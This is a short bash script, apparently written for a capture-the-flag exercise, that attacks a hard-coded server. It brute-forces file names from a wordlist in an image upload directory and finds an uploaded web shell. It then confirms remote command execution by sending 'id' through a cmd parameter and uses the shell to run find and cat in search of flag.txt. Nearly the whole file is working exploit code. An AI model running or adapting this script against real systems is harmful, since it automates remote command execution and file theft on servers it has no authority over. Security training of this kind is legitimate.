#!/bin/bash
# Comprehensive flag finder with upload testing
# Usage: ./find_flag_with_upload.sh wordlist.txt

if [ $# -eq 0 ]; then
    echo "Usage: $0 wordlist.txt"
    exit 1
fi

input="$1"
timestamp=$(date +"%Y%m%d_%H%M%S")
output_file="flag_search_${timestamp}.log"

echo "Starting flag search..." | tee "$output_file"

while IFS= read -r line; do
    # Test if file exists in upload directory
    status=$(curl -s -o /dev/null -w "%{http_code}" "http://83.136.251.68:53279/profile_images/$line")
    
    if [ "$status" -eq 200 ]; then
        echo "[+] Found accessible file: $line" | tee -a "$output_file"
        
        # Test for command execution
        exec_test=$(curl -s "http://83.136.251.68:53279/profile_images/$line?cmd=id")
        if [[ "$exec_test" == *"uid="* ]]; then
            echo "[!] COMMAND EXECUTION WORKING!" | tee -a "$output_file"
            
            # Search for flag
            echo "[*] Searching for flag.txt..." | tee -a "$output_file"
            flag_locations=$(curl -s "http://83.136.251.68:53279/profile_images/$line?cmd=find / -type f -name flag.txt 2>/dev/null")
            
            if [ -n "$flag_locations" ]; then
                echo -e "\033[32m[+] FLAG LOCATIONS FOUND:\033[0m" | tee -a "$output_file"
                echo "$flag_locations" | tee -a "$output_file"
                
                # Retrieve first found flag
                first_flag=$(echo "$flag_locations" | head -1)
                flag_content=$(curl -s "http://83.136.251.68:53279/profile_images/$line?cmd=cat $(echo $first_flag | sed 's/ /\\ /g')")
                echo -e "\033[32m[+] FLAG CONTENT:\033[0m $flag_content" | tee -a "$output_file"
                exit 0
            else
                echo "[-] No flag.txt found via find command" | tee -a "$output_file"
            fi
        fi
    fi
done < "$input"

echo "[-] Flag not found through automated search" | tee -a "$output_file"
